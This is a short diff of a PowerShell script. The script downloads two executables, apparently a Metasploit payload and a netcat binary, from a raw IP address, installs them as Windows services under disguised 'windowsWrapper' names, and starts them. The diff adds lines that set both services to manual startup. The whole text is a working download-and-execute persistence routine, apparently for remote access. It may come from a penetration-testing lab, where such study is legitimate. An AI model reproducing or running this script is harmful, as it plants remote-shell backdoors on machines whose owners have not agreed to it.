@@ -5,5 +5,7 @@ Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrappe
 Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperNC.exe -OutFile C:/windowsWrapperNC.exe;
 New-Service -Name 'windowsMSF' -BinaryPathName 'c:\windowsWrapperMSF.exe'
 New-Service -Name 'windowsNC' -BinaryPathName 'c:\windowsWrapperNC.exe'
+Set-Service windowsMSF -StartupType manual
+Set-Service windowsNC -StartupType manual
 Start-Service -Name "windowsMSF"
 Start-Service -Name "windowsNC"
